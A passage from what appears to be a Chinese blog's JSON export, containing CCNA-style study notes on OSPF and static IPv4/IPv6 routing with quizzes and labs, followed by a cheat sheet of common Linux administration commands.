相同，那么两台路由器将成功建立 OSPF 邻接关系。 OSPF区域OSPF Areas OSPF区域号既可以配置为一个0到4294967295之间的整数，也可使用点分十进制表示法（也就是采用 IP 地址格式）。与 OSPF 进程号不同，为建立邻接关系， OSPF 区域号必须匹配。最常见 OSPF 区域配置类型为使用一个整数来指定 OSPF 区域。确保对支持的两种区域配置方式都要熟悉。 OSPF路由器IDOSPF Router ID 为令到 OSPF 在某个网络上运行起来，所有路由器都必须有个唯一身份编号（a unique identifying number），且在 OSPF 环境下要用到路由器 ID 。 在决定 OSPF 路由器 ID 时，思科 IOS 选用所配置环回接口中最高的 IP 地址。如未曾配置环回接口，软件就会使用所有配置的物理接口中最高的 IP 地址，来作为 0SPF 路由器 ID 。思科 IOS 软件同样允许管理员使用路由器配置命令router-id [address], 来手动指定路由器 ID 。 环回接口极为有用，特别是在测试当中，因为它们无需硬件且是逻辑的，因此绝不会宕掉。 在下面的路由器上，给Loopback0配置了 IP 地址1.1.1.1&#x2F;32, 给F0&#x2F;0配置了2.2.2.2&#x2F;24。接着在路由器上给所有接口配置了 OSPF 。 Router(config-if)#router ospf 1Router(config-router)#net 0.0.0.0 255.255.255.255 area 0Router(config-router)#endRouter#%SYS-5-CONFIG_I: Configured from console by consoleRouter#show ip protocolsRouting Protocol is “ospf 1” Outgoing update filter list for all interfaces is not set Incoming update filter list for all interfaces is not set Router ID 1.1.1.1 Number of areas in this router is 1. 1 normal 0 stub 0 nssa Maximum path: 4 Routing for Networks: 0.0.0.0 255.255.255.255 area 0 Routing Information Sources: Gateway Distance Last Update 1.1.1.1 110 00:00:14 Distance: (default is 110)但又想要将路由器 ID 硬编码（hard code）为10.10.10.1。那么可通过再配置一个使用该 IP 地址的环回接口，或简单地将这个 IP 地址加在 OSPF 路由器 ID 处。为令到改变生效，必须重启路由器或在路由器上清除该IP OSPF进程（清除现有数据库）。 Router#conf tEnter configuration commands, one per line.End with CNTL&#x2F;Z.Router(config)#router ospf 1Router(config-router)#router-id 10.10.10.1Router(config-router)#Reload or use “clear ip ospf process” command, for this to take effectRouter(config-router)#endRouter#%SYS-5-CONFIG_I: Configured from console by consoleRouter#clear ip ospf processReset ALL OSPF processes? [no]: yesRouter#show ip protRouting Protocol is “ospf 1” Outgoing update filter list for all interfaces is not set Incoming update filter list for all interfaces is not set Router ID 10.10.10.1 Number of areas in this router is 1. 1 normal 0 stub 0 nssa Maximum path: 4 Routing for Networks: 0.0.0.0 255.255.255.255 area 0 Routing Information Sources: Gateway Distance Last Update 1.1.1.1 110 00:03:15Distance: (default is 110)到第39天，DR和 BDR 选举时，就将看到这个路由器 ID 有着特别的重要性。 OSPF被动接口OSPF Passive Interfaces 被动接口可被描述成在其上没有路由更新发出的接口。在思科 IOS 软件中，通过使用路由器配置命令passive-interface [name], 将某接口配置为被动接口。如路由器上有多个接口需要配置为被动接口，就应使用passive-interface default这个路由器配置命令。此命令将路由器上那些位处所配置网络范围内的所有接口，都配置为被动模式。而那些需要允许在其上形成邻接关系或邻居关系的接口，就应使用路由器配置命令no passive-interface [name]对其进行配置。 被动接口配置在 OSPF 和 EIGRP 中的工作方式是一样的，也就是一旦某接口被标记为被动接口，经由该接口形成的所有邻居关系都会被拆除，同时 再也不会通过该接口发送或接收Hello数据包了。不过，根据路由器上所配置的网络配置语句，该接口仍然会继续受通告。 Router(config)#router ospf 10Router(config-router)#passive-interface f0&#x2F;0Router#show ip ospf int f0&#x2F;0FastEthernet0&#x2F;0 is up, line protocol is up Internet address is 192.168.1.1&#x2F;24, Area 0 Process ID 10,Router ID 172.16.1.1,Network Type BROADCAST, Cost: 1 Transmit Delay is 1 sec, State WAITING, Priority 1 No designated router on this network No backup designated router on this network Timer intervals configured,Hello 10, Dead 40, Wait 40,Retransmit 5 No Hellos (Passive interface)第 12 天问题What protocol does OSPF use?How does OSPF determine whether other Link State routers are operating on the interfaces as well?When a _______ routing protocol is enabled for a particular link, information associated with that network is added to the local Link State Database (LSDB).OSPF utilises IP Multicast when sending and receiving updates on Multi-Access networks, such as Ethernet. True or false?OSPF is a hierarchical routing protocol that logically divides the network into subdomains referred to as _______.Name at least 4 OSPF network types.Name the command used to enter OSPF configuration mode.When determining the OSPF router ID, Cisco IOS selects the lowest IP address of the configured Loopback interfaces. True or false?What command can you use to assign an interface to OSPF Area 2 (interface level command)?_______ can be described as interfaces over which no routing updates are sent.##第 12 天答案 IP number 89.By sending Hello packets.Link State.True.Areas.Non-Broadcast, Point-to-Point, Broadcast, Point-to-Multipoint, Point-to-Multipoint Non-Broadcast, and Loopback.The router ospf command.False.The ip ospf area 2Passive.##第 12 天实验 ###OSPF基础实验 沿用第10天的实验场景（两台直接连接的路由器，各自其上的环回接口），但取代配置 RIP 及对物理和环回接口进行通告的是，使用OSPF 0号区域实现（but instead of configuring RIP and advertising the physical and Loopback interfaces, do this using OSPF Area 0）。 分配一个 IPv4 地址给直接连接的接口（10.10.10.1&#x2F;24及10.10.10.2&#x2F;24）运用ping操作，测试直接连通性分别在两台路由器上配置一个环回接口，并自两个不同范围为其分配上地址（11.11.11.1&#x2F;32及12.12.12.2&#x2F;32）配置上标准OSPF 1号进程，并在0号区域中通告所有本地网络。同时为两台设备配置一个路由器 ID 。R1: router ospf 1router-id 1.1.1.1network 10.10.10.0 0.0.0.255 area 0network 11.11.11.1 0.0.0.0 area 0R2: router ospf 1router-id 2.2.2.2network 10.10.10.0 0.0.0.255 area 0network 12.12.12.2 0.0.0.0 area 0自R1向R2的环回接口执行 ping 操作，以测试连通性执行一条show ip route命令，来验证有通过 OSPF 接收到路由执行一条show ip protocols命令，来验证有配置 OSPF 且在设备上是活动的坚持特定于 OSPF 的接口参数：show ip ospf interface及show ip ospf interface brief在两台路由器上（直接连接接口）修改 OSPF 的 Hello 包和死亡计时器：ip ospf hello及ip ospf dead执行一下show ip ospf 1命令，看看路由进程参数重复该实验，但这次使用ip ospf 1 area 0 interface specific命令，而不是在router OSPF 下的network命令，对各个网络进行通告。","categories":[],"tags":[]},{"title":"静态路由","slug":"静态路由","date":"2022-11-13T16:01:03.000Z","updated":"2023-12-02T12:28:05.302Z","comments":true,"path":"2022/11/14/静态路由/","link":"","permalink":"http://example.com/2022/11/14/%E9%9D%99%E6%80%81%E8%B7%AF%E7%94%B1/","excerpt":"静态路由配置Configuring Static Routes 配置一条静态路由（见下图11.1）需要以下这些命令。 network address&#x2F;prefix maskaddress or exit interfacedistance (optional)这里是一个这些命令使用的实例。 RouterA(config)#ip route network prefix mask {address | interface} [distance]","text":"静态路由配置Configuring Static Routes 配置一条静态路由（见下图11.1）需要以下这些命令。 network address&#x2F;prefix maskaddress or exit interfacedistance (optional)这里是一个这些命令使用的实例。 RouterA(config)#ip route network prefix mask {address | interface} [distance] 静态路由示例网络 图11.1 – 静态路由示例网络 要加入上面网络的一条静态路由，就要在左边的路由器上写出下面这行配置。 Router(config)#ip route 192.168.1.0 255.255.255.0 172.16.1.2对静态路由，需要指定在前往目的地址的路途上，路由器需要去往的下一跳 IP 地址，或者也可以指定一个出去的接口。通常不需要知道下一跳地址，因为那就是 ISP ，或者 IP 地址会随时变化（见下图11.2）。如果是这样，就要使用出去的接口。 不总是知道下一跳地址的情形 图11.2 – 不总是知道下一跳地址的情形 Router(config)#ip route 192.168.1.0 255.255.255.0 s0&#x2F;0上面的命令行告诉路由器将目的为192.168.1.10网络的流量，从串行接口发出。而下面的命令则是告诉路由器将所有网络的所有流量，都从串行接口发出。 Router(config)#ip route 0.0.0.0 0.0.0.0 s0&#x2F;0上面的路由实际上就是一条默认路由（a default route）。默认路由用于引导那些未在路由表中显式列出的目的网络的数据包。 静态 IPv6 路由的配置Configuring Static IPv6 Routes 静态 IPv6 路由的配置，与静态 IPv4 路由的配置遵循同样的逻辑。在思科 IOS 软件中，全局配置命令ipv6 route [ipv6-prefix&#x2F;prefix-length] [next-hop-address | interface] [distance &lt;1-254&gt; | multicast | tag | unicast]用于配置静态 IPv6 路由。当中的一些关键字是熟悉的，因为它们也适用于 IPv4 静态路由，而[multicast]关键字则是 IPv6 所独有的，用于配置一条 IPv6 静态多播路由(an IPv6 static Multicast route)。如用到此关键字，该路由就不会进到单薄路由表（the Unicast routing table），同时也绝不会用于转发单播流量。为确保该路由绝不会安装到单播路由信息库（the Unicast RIB）, 思科 IOS 软件将该条路由（静态多播路由）的管理距离设置为255。 相反，[unicast]关键字则是用于配置一条 IPv6 静态单播路由。如用到此关键字，该条路由就绝不会进入到多播路由表（the Multicast routing table）, 并仅被用于转发单播流量。而既没用到[multicast]关键字，也没用到[unicast]关键字时，默认情况下，该条路由机会用于单播数据包的转发，也会用于多播数据包的转发。 以下的配置示例，演示了如何来配置3条静态 IPv6 路由。第一条路由，到子网3FFF:1234:ABCD:0001::&#x2F;64, 会将流量从FastEthernet0&#x2F;0转发出去。此路由仅用于单播流量的转发。第二条路由，到子网3FFF:1234:ABCD:0002::&#x2F;64, 会将到那个子网的数据包从Serial0&#x2F;0，使用下一跳路由器的数据链路层地址，作为 IPv6 的下一跳地址转发出去。本条路由仅会用于多播流量。最后，同样配置了一条指向Serial0&#x2F;1作为出口接口的默认路由。此默认路由将会通过Serial0&#x2F;1, 使用下一跳路由器的本地链路地址作为 IPv6 下一跳地址，转发那些到未知 IPv6 目的地址的数据包。这些路由如下面所示。 R1(config)#ipv6 route 3FFF:1234:ABCD:0001::&#x2F;64 Fa0&#x2F;0 unicastR1(config)#ipv6 route 3FFF:1234:ABCD:0002::&#x2F;64 Se0&#x2F;0 FE80::2222 multicastR1(config)#ipv6 route ::&#x2F;0 Serial0&#x2F;1 FE80::3333依此配置，命令show ipv6 route可用于验证在本地路由器上应用的静态路由配置，如下所示。 R1#show ipv6 route staticIPv6 Routing Table - 13 entriesCodes: C - Connected, L - Local, S - Static, R - RIP, B - BGP U - Per-user static route I1 - ISIS L1, I2 - ISIS L2, IA - ISIS inter area, IS - ISIS summary O - OSPF intra, OI - OSPF inter, OE1 - OSPF ext 1, OE2 - OSPF ext 2 ON1 - OSPF NSSA ext 1, ON2 - OSPF NSSA ext 2S ::&#x2F;0 [1&#x2F;0] via FE80::3333, Serial0&#x2F;1S 3FFF:1234:ABCD:1::&#x2F;64 [1&#x2F;0] via ::, FastEthernet0&#x2F;0S 3FFF:1234:ABCD:2::&#x2F;64 [1&#x2F;0] via FE80::2222, Serial0&#x2F;0除了使用show ipv6 route命令外，命令show ipv6 static [prefix] [detail]也可一用来对所有或仅是某条特定静态路由的细节信息进行查看。下面输出演示了如何使用这个命令。 R1#show ipv6 static 3FFF:1234:ABCD:1::&#x2F;64 detailIPv6 static routesCode: * - installed in RIB 3FFF:1234:ABCD:1::&#x2F;64 via interface FastEthernet0&#x2F;0, distance 1静态路由排错Troubleshooting Satic Routes 排错总会涉及到某个配置问题（如果不是接口宕掉的话）。如流量没有到达目的地，就可以使用命令traceroute测试该路由。 注意 – 今天内容很少，所以请前往第 12 天吧，因为那将是个非常充实的主题。 第 11 天问题Name the three parameters needed to configure a static route.What is the command used to configure a static route?What is the command used to configure a default static route?What is the command used to configure an IPv6 static route?What is the command used to view IPv6 static routes?第 11 天答案Network address, subnet mask (prefix length), and next-hop address or exit interface.The ip route command.The ip route 0.0.0.0 0.0.0.0 command.The ipv6 route command.The show ipv6 route static command.第 11 天实验静态路由实验Static Routes Lab 拓扑图 静态路由实验拓扑图 实验目的 学习如何以下一跳地址和出口接口方式，将静态路由指定给一台路由器。 实验步骤 按照上面的拓扑图分配 IP 地址。Router A可以是192.168.1.1&#x2F;30, Router B可以是.2。 通过串行链路进行ping操作，以确保该链路是工作的。 在Router A上指定一条静态路由，将到10.1.1.0&#x2F;10网络的所有流量，从串行接口发送出去。当然要使用你自己的串行端口编号；不要只是拷贝我的配置，你的接口有不同编号！ RouterA(config)#ip route 10.0.0.0 255.192.0.0 Serial0&#x2F;1&#x2F;0RouterA(config)#exitRouterA#ping 10.1.1.1Type escape sequence to abort.Sending 5, 100-byte ICMP Echos to 10.1.1.1, timeout is 2 seconds:!!!!!Success rate is 100 percent (5&#x2F;5), round-trip min&#x2F;avg&#x2F;max &#x3D; 18&#x2F;28&#x2F;32 msRouterA#RouterA#show ip routeCodes: C - Connected, S - Static, I - IGRP, R - RIP, M - Mobile, B - BGP D - EIGRP, EX - EIGRP external, O - OSPF, IA - OSPF inter area N1 - OSPF NSSA external type 1, N2 - OSPF NSSA external type 2 E1 - OSPF external type 1, E2 - OSPF external type 2, E - EGP i - IS-IS, L1 - IS-IS level-1, L2 - IS-IS level-2, ia - IS-IS inter area * - Candidate default, U - Per-user static route, o - ODR P - Periodic downloaded static routeGateway of last resort is not set 10.0.0.0&#x2F;10 is subnetted, 1 subnetsS 10.0.0.0 is directly connected, Serial0&#x2F;1&#x2F;0 172.16.0.0&#x2F;24 is subnetted, 1 subnetsC 172.16.1.0 is directly connected, Loopback0 192.168.1.0&#x2F;30 is subnetted, 1 subnetsC 192.168.1.0 is directly connected, Serial0&#x2F;1&#x2F;0RouterA#RouterA#show ip route 10.1.1.1Routing entry for 10.0.0.0&#x2F;10Known via “ static ”, distance 1, metric 0 (connected) Routing Descriptor Blocks: directly connected, via Serial0&#x2F;1&#x2F;0Route metric is 0, traffic share count is 1 RouterA#在Router B上配置一条静态路由，将到172.16.1.0&#x2F;24网络的所有流量，发到下一跳地址192.168.1.1。 RouterB(config)#ip route 172.16.1.0 255.255.255.0 192.168.1.1RouterB(config)#exitRouterB#ping 172.16.1.1Type escape sequence to abort.Sending 5, 100-byte ICMP Echos to 172.16.1.1, timeout is 2 seconds:!!!!!RouterB#show ip route 172.16.1.1Routing entry for 172.16.1.0&#x2F;24Known via “ static ”, distance 1, metric 0 Routing Descriptor Blocks: 192.168.1.1 Route metric is 0, traffic share count is 1RouterB#","categories":[],"tags":[]},{"title":"linux运维常用命令","slug":"linux运维常用命令","date":"2022-11-10T16:01:03.000Z","updated":"2023-12-02T12:27:44.269Z","comments":true,"path":"2022/11/11/linux运维常用命令/","link":"","permalink":"http://example.com/2022/11/11/linux%E8%BF%90%E7%BB%B4%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/","excerpt":"1、文件、目录操作命令（18个）ls 即list：列出目录的内容及其内容属性信息。主要参数：-a：显示隐藏文件 -l：是以更详细的列表形式显示-S： drwxr-xr-x (也可以用二进制表示 111 101 101 –&gt; 755)","text":"1、文件、目录操作命令（18个）ls 即list：列出目录的内容及其内容属性信息。主要参数：-a：显示隐藏文件 -l：是以更详细的列表形式显示-S： drwxr-xr-x (也可以用二进制表示 111 101 101 –&gt; 755) d：标识节点类型(d：文件夹 -：文件 l:链接) r：可读 w：可写 x：可执行 第一组rwx： ## 表示这个文件的拥有者对它的权限：可读可写可执行 第二组r-x： ## 表示这个文件的所属组用户对它的权限：可读，不可写，可执行 第三组r-x： ## 表示这个文件的其他用户(相对于上面两类用户)对它的权限：可读，不可写，可执行1234567891011以下命令参数只截取部分，不全； eg1： ls -F 查看目录中的文件 ls *[0-9]* 显示包含数字的文件名和目录名 ls &#x2F;tmp | pr -T5 -W$COLUMNS 将终端划分成5栏显示12345cd 即change directory：从当前工作目录切换到指定的工作目录cd - &#x2F;&#x2F;返回上次所在的目录1cp 全拼为copy，功能为复制文件或目录。eg1： 复制目录及其下隐藏文件到目标——&gt;2种方法：1）方法一： cp -rf ls -A1 --color=never 目标目录1其中：–color&#x3D;never选项是为了关闭ls的彩色显示，一般都是打开的，如果打开了，会包含彩色显示的转义字符，cp命令会提示找不到文件。-1选项，让ls一行只显示一个文件或目录名，仅是为看着舒服，这里加不加都不影响。如果已经将非隐藏的文件或目录复制过去了，仅想复制隐藏的文件和目录，执行以下命令： cp -urf ls -A1 --color=never 目标目录1其中：-u参数，只会复制目标目录下不存在的文件；或者目标目录下存在，但当前目录下更新的文件。2）方法二： cp -rf ls -d .[^.]* --color=never 目标目录1其中：-d 不展开目录显示，.[^.]*匹配当前目录下以.开头的文件和目录。 tree 显示文件和目录由根目录开始的树形结构lstree 显示文件和目录由根目录开始的树形结构tree -d &#x2F;&#x2F;树状显示目录12find 查找，用于查找目录及目录下文件。语法：find [path…] [expression_list] 【工作原理】 其中，expression分为三种：options、test、action。对于多个表达式，find是从左向右处理的，所以表达式的前后顺序不同会造成不同的搜索性能差距。find命令默认递归遍历所指定的目录树，针对每个文件依次执行find命令中的表达式，表达式首先根据逻辑运算符进行结合，然后依次从左至右对表达式求值。 find首先对整个命令行进行语法解析，并应用给定的options，然后定位到搜索路径path下开始对路径下的文件或子目录进行表达式评估或测试，评估或测试的过程是按照表达式的顺序从左向右进行的(此处不考虑操作符的影响)，如果最终表达式的表达式评估为true，则输出(默认)该文件的全路径名。 对于find来说，一个非常重要的概念：find的搜索机制是根据表达式返回的true&#x2F;false决定的，每搜索一次都判断一次是否能确定最终评估结果为true，只有评估的最终结果为true才算是找到，并切入到下一个搜索点。eg1：find &#x2F;tmp -type f -name “*.log” -exec ls ‘{}’ ; -print，##该find中给定了两个test，两个action，它们之间从前向后按顺序进行评估 表达式优先级如下： 其中，-regex：这个参数和 -name 有类似的作用，都是通过文件的名字进行匹配，但是二者的不同的点是： 1）-name 只是对文件的名称做匹配，而-regex 是对文件的路径做匹配;-regex不是匹配文件名，而是匹配完整的文件名（包括路径）。例如，当前目录下有一个文件”abar9”，如果你用”ab.*9”来匹配，将查找不到任何结果，正确的方法是使用”.*ab.9”或者”.&#x2F;ab.*9”来匹配。2） 在需要用正则表达式的时候，-regex 会比 -name方便很多， -name 是不支持正则表达式的，name 选项只支持通配符 * ? []，正则表达式有不同的标准，所以在find命令中可以通过 -regextype 来指定采用的正则表达式规范 , 从而让 -regex 按照指定的正则表达式规范工作，默认是 emacs 规范；另外有posix-awk, posix-basic, posix-egrep and posix-extended四种，可在man中获取得到。 用法：find dir -regextype “type” -regex “pattern” 示例：find . -regextype grep -regex “.*&#x2F;[0-9]{4}$” | head &#x2F;&#x2F;查找文件名称是4个数字构成的文件，然后取结果的前10行，其中-regex 采用的是 和 grep 命令相同的正则表达式规范；-regex 表达式忽略了文件的路径“.&#x2F;”,需在启后指定路径。 如果用name： find . -name “[0-9][0-9][0-9][0-9]” | head -name 选项：按照文件名模式来匹配文件，若匹配则返回true，否则返回false。最好用引号将文件名模式引起来，防止shell自己解析要匹配的字符串。（可以用单引号也可以用双引号，单引号和双引号在shell环境中的区别，后者内不全是普通字符，前者特殊字符会被shell识别）-name对大小写字母敏感，如果想匹配时不考虑大小写可以使用-iname测试项. find . -name “[A-Za-b]*” -print &#x2F;&#x2F;当前目录及子目录中查找文件名以一个大写字母开头或者以小写a或b开头的文件 find . -name “[^A-Z][a-z][0-9][0-9].txt” -print &#x2F;&#x2F;当前目录查找文件名不以大写字母开头，之后跟一个小写字母，再之后是两个数字，最后是.txt的文件;注意,此处的模式匹配并不符合正则表达式。 find . -size +0c -wholename “e[0-9]*” -o ! &#x2F;( -name “.” -o -name “phone” &#x2F;) -prune -name “.c” -user xixi -o -name “*phone” &#x2F;&#x2F;-prune是一个动作项，它表示当文件是一个目录文件时，不进入此目录进行搜索。-prune经常和-path或-wholename一起使用，以避开某个目录，常见的形式是： find PATH (-path &lt;don’t want this path #1&gt; -o -path &lt;don’t want this path #2&gt;) -prune -o -path &#x2F;&#x2F;注意:如果同时使用-depth设置项，那么-prune将被find命令忽略。 find . -maxdepth 1 -name *.jpg -print -exec convert “{}” -resize 80x60 “thumbs&#x2F;{}” ; #批量调整当前目录中的文件大小并将它们发送到指定的缩略图目录 find &#x2F; -user user1 搜索属于用户 ‘user1’ 的文件和目录find &#x2F;usr&#x2F;bin -type f -atime +100 搜索在过去100天内未被使用过的执行文件find &#x2F;usr&#x2F;bin -type f -mtime -10 搜索在10天内被创建或者修改过的文件find &#x2F; -name \\*.rpm -exec chmod 755 ‘{}’ ; 搜索以 ‘.rpm’ 结尾的文件并定义其权限find &#x2F; -xdev -name *.rpm 搜索以 ‘.rpm’ 结尾的文件，忽略光驱、捷盘等可移动设备 更多参考：参考1；参考2 locate *.ps 寻找以 ‘.ps’ 结尾的文件 - 先运行 ‘updatedb’ 命令whereis halt 显示一个二进制文件、源码或man的位置which halt 显示一个二进制文件或可执行文件的完整路径 vim&#x2F;vi 文本编辑器：1）常用快捷键：(在一般模式下使用)： a ：在光标后一位开始插入 A 在该行的最后插入 I 在该行的最前面插入 gg 直接跳到文件的首行 G 直接跳到文件的末行 dd 删除一行；3dd 删除3行；yy 复制一行；3yy 复制3行；p 粘贴；u：即undo撤销操作； v ：进入字符选择模式，选择完成后，按y复制，按p粘贴 ctrl+v 进入块选择模式，选择完成后，按y复制，按p粘贴 shift+v 进入行选择模式，选择完成后，按y复制，按p粘贴 2）查找并替换 1 显示行号 :set nu 2 隐藏行号：:set nonu 3 查找关键字 :&#x2F;you ## 效果：查找文件中出现的you，并定位到第一个找到的地方，按n可以定位到下一个匹配位置(按N定位到上一个) 4 替换操作 ：s&#x2F;sad&#x2F;bbb 查找光标所在行的第一个sad，替换为bbb :%s&#x2F;sad&#x2F;bbb 查找文件中所有sad，替换为bbb 其他：mkdir 全拼为make directories，其功能是创建目录。-p：创建多级目录；mv 全拼为move，其功能是移动或重命名文件。pwd 全拼为print working directory，功能是显示当前工作目录的绝对路径。rename 用于重新命名文件。rm 全拼为remove，其功能是删除一个或多个文件或目录。rmdir 全拼为remove empty directories，功能是删除空目录。touch 创建个空文件，改变已有文件的时间戳属性。tree 功能是以树形结构显示目录下的内容。basename 显示文件名或着目录名。dirname 显示文件或着目录路径。chattr 改变文件扩展属性。lsattr 查看文件扩展属性。file 显示文件类型。md5sum 计算和校验文件的MD5值。rmdir dir1 删除一个叫做 ‘dir1’ 的目录’rm -rf dir1 删除一个叫做 ‘dir1’ 的目录并同时删除其内容rm -rf dir1 dir2 同时删除两个目录及它们的内容ln -s file1 lnk1 创建一个指向文件或目录的软链接ln file1 lnk1 创建一个指向文件或目录的物理链接touch -t 0712250000 file1 修改一个文件或目录的时间戳 (格式：YYMMDDhhmm)file file1 文件类型查看iconv -l 列出已知的编码 2、查看文件、内容处理命令（21个）at 全拼为concatenate，功能是用于连接多个文件并且打印到屏幕输出或重定向到指定文件中。tac tac是cat的反向拼写，因此命令的功能为反向显示文件内容。more 分页显示文件内容。less 分页显示文件内容，more命令的相反用法。 head 显示文件内容头部。head -10 install.log 查看文件头部的10行 tail 显示文件内容尾部。tail -10 install.log 查看文件尾部的10行 tail +10 install.log 查看文件 10–&gt;末行 tail -f install.log 小f跟踪文件的唯一inode号，就算文件改名后，还是跟踪原来这个inode表示的文件 tail -F install.log 大F按照文件名来跟踪 cut： 将文件的每一行按指定分隔符分割并输出。split 分割文件为不同的片段。paste 按行合并文件内容。sort 对文件的文本内容排序。uniq 去除掉重复行。wc 统计文件行数、单词数或是字节数。iconv 转换文件编码格式。dos2unix 将DOS格式文件转换成UNIX格式。diff 全拼为difference，比较文件差异，用于文本文件。vimdiff 命令行可视化文件比较工具，用于文本文件。rev 反向输出文件内容。grep&#x2F;egrep 常用于过滤字符串。join 按两个文件的相同字段合并。tr 替换、删除字符。vi&#x2F;vim 命令行文本编辑器。 3、搜索文件命令（4个）which 查找二进制文件的命令，按环境变量PATH路径查找。which ls &#x2F;&#x2F;查找可执行的命令所在的路径 find 从磁盘遍历查找文件或目录。find &#x2F; -name “hadooop*” -ok rm {} ; find &#x2F; -name “hadooop*” -exec rm {} ;find &#x2F;home -user hadoop -type d -ls ##查找用户为hadoop的文件夹1234whereis 查找二进制文件的命令，按环境变量PATH路径查找。相对于which，whereis 查找可执行的命令和帮助的位置； locate 从数据库&#x2F;var&#x2F;lib&#x2F;mlocate&#x2F;mlocate.db中查找命令，使用updatedb更新库。4、文件压缩及解压缩命令（4个）tar 打包压缩。tar -cvzf bak.tar .&#x2F;aaa 将&#x2F;etc&#x2F;password追加文件到bak.tar中(r) tar -rvf bak.tar &#x2F;etc&#x2F;passwordtar -xvf bak.tar解压到&#x2F;usr&#x2F;下：tar -zxvf a.tar.gz -C &#x2F;usr查看压缩包内容tar -ztvf a.tar.gz tar -cvf archive.tar file1 创建一个非压缩的 tarballtar -cvf archive.tar file1 file2 dir1 创建一个包含了 ‘file1’, ‘file2’ 以及 ‘dir1’的档案文件tar -tf archive.tar 显示一个包中的内容tar -xvf archive.tar 释放一个包tar -xvf archive.tar -C &#x2F;tmp 将压缩包释放到 &#x2F;tmp目录下tar -cvfj archive.tar.bz2 dir1 创建一个bzip2格式的压缩包tar -xvfj archive.tar.bz2 解压一个bzip2格式的压缩包tar -cvfz archive.tar.gz dir1 创建一个gzip格式的压缩包tar -xvfz archive.tar.gz 解压一个gzip格式的压缩包123456789unzip 解压和zip压缩文件。zip file1.zip file1 创建一个zip格式的压缩包zip -r file1.zip file1 file2 dir1 将几个文件和目录同时压缩成一个zip格式的压缩包unzip file1.zip 解压一个zip格式压缩包123gzip 压缩工具。gunzip a.txt.gz或gzip -d a.txt.gzgunzip file1.gz 解压一个叫做 ‘file1.gz’的文件gzip file1 压缩一个叫做 ‘file1’的文件gzip -9 file1 最大程度压缩1234bzip2和bunzip2解压缩bunzip2 a.bz2 bzip2 -d a.bz2123打包并压缩成bz2 ： tar -jcvf a.tar.bz2——&gt;解压：tar -jxvf a.tar.bz2bunzip2 file1.bz2 解压一个叫做 ‘file1.bz2’的文件bzip2 file1 压缩一个叫做 ‘file1’ 的文件 rar压缩和unrar解压缩rar a file1.rar test_file 创建一个叫做 ‘file1.rar’ 的包rar a file1.rar file1 file2 dir1 同时压缩 ‘file1’, ‘file2’ 以及目录 ‘dir1’rar x file1.rar 解压rar包unrar x file1.rar 解压rar包12345、系统信息查询命令（11个）uname 显示操作系统相关信息。hostname 显示或者设置当前系统的主机名。dmesg 显示开机信息，用于诊断系统故障。uptime 显示系统运行时间以及负载。stat 显示文件或文件系统的状态。arch 显示机器的处理器架构(1)uname -m 显示机器的处理器架构(2)dmidecode -q 显示硬件系统部件 (SMBIOS &#x2F; DMI)hdparm -i &#x2F;dev&#x2F;hda 罗列一个磁盘的架构特性hdparm -tT &#x2F;dev&#x2F;sda 在磁盘上执行测试性读取操作cat &#x2F;proc&#x2F;cpuinfo 显示CPU info的信息cat &#x2F;proc&#x2F;interrupts 显示中断cat &#x2F;proc&#x2F;meminfo 校验内存使用cat &#x2F;proc&#x2F;swaps 显示哪些swap被使用cat &#x2F;proc&#x2F;version 显示内核的版本cat &#x2F;proc&#x2F;net&#x2F;dev 显示网络适配器及统计cat &#x2F;proc&#x2F;mounts 显示已加载的文件系统lspci -tv 罗列 PCI 设备lsusb -tv 显示 USB 设备 top 实时显示系统资源使用情况。free 查看系统内存date 显示、设置系统时间cal 查看日历、时间信息cal 2021 显示2021年的日历表date 041217002021.00 设置日期和时间 - 月日时分年.秒clock -w 将时间修改保存到 BIOS1234567891011121314151617181920212223242526276、用户管理及权限、用户授权，登陆相关命令（21个）useradd 添加用户。添加一个tom用户，设置它属于users组，并添加注释信息：useradd -g users -c “hr tom” tomuseradd -c “Name Surname “ -g admin -d &#x2F;home&#x2F;user1 -s &#x2F;bin&#x2F;bash user1 创建一个属于 “admin” 用户组的用户 usermod 修改系统已经存在用户属性。修改tom用户的登陆名为tomcat：usermod -l tomcat tom 将tomcat添加到sys和root组（-G，-g）中：usermod -G sys,root tomcat查看tomcat的组信息：groups tomcatusermod -c “User FTP” -g system -d &#x2F;ftp&#x2F;user1 -s &#x2F;bin&#x2F;nologin user1 修改用户属性 userdel 删除用户。userdel -r spark 加一个-r就表示把用户及用户的主目录都删除 groupadd 添加用户群组+groupmod组修改passwd 修改用户密码。chage 修改用户密码有效期限。id 查看用户的uid&#x2F;gid及归属的用户群组123groupmod -n new_group_name old_group_name 重命名一个用户组 chmod 改变文件、目录权限chmod -R 770 aaa&#x2F; ##如果要将一个文件夹的所有内容权限统一修改，则可以-R参数chmod ugo+rwx directory1 ##设置目录的所有人(u)、群组(g)以及其他人(o)以读（r ）、写(w)和执行(x)的权限chmod go-rwx directory1 ##删除群组(g)与其他人(o)对目录的读写执行权限123find &#x2F; -perm -u+s 罗列一个系统中所有使用了SUID控制的文件chmod u+s &#x2F;bin&#x2F;file1 设置一个二进制文件的 SUID 位 - 运行该文件的用户也被赋予和所有者同样的权限chmod u-s &#x2F;bin&#x2F;file1 禁用一个二进制文件的 SUID位chmod g+s &#x2F;home&#x2F;public 设置一个目录的SGID 位 - 类似SUID ，不过这是针对目录的chmod g-s &#x2F;home&#x2F;public 禁用一个目录的 SGID 位chmod o+t &#x2F;home&#x2F;public 设置一个文件的 STIKY 位 - 只允许合法所有人删除文件chmod o-t &#x2F;home&#x2F;public 禁用一个目录的 STIKY 位chgrp 更改文件用户群组。12345678chown 改变文件、目录的属主和属组chown :angela aaa ## 改变所属组chown angela:angela aaa&#x2F; ## 同时修改所属用户和所属组chown -R user1 directory1 ##改变一个目录的所有人属性并同时改变改目录下所有文件的属性123umask 显示、设置权限掩码。whoami 显示当前有效用户名称，相当于执行id -un命令。who 显示目前已登录系统的用户信息。w 显示已登陆系统的用户列表，并显示用户正在执行的指令。last 显示已登入系统的用户。lastlog 显示系统中所有用户最近一次的登录信息。users 显示当前登录系统的所有用户的用户列表。finger 查找、显示用户信息。12345678gpasswd将tomcat用户从root组和sys组删除：gpasswd -d tomcat root&amp;&amp;gpasswd -d tomcat sys将america组名修改为am：groupmod -n am america chattr 配置文件的特殊属性 - 使用 “+” 设置权限，使用 “-” 用于取消chattr +a file1 只允许以追加方式读写文件chattr +c file1 允许这个文件能被内核自动压缩&#x2F;解压chattr +d file1 在进行文件系统备份时，dump程序将忽略这个文件chattr +i file1 设置成不可变的文件，不能被删除、修改、重命名或者链接chattr +s file1 允许一个文件被安全地删除chattr +S file1 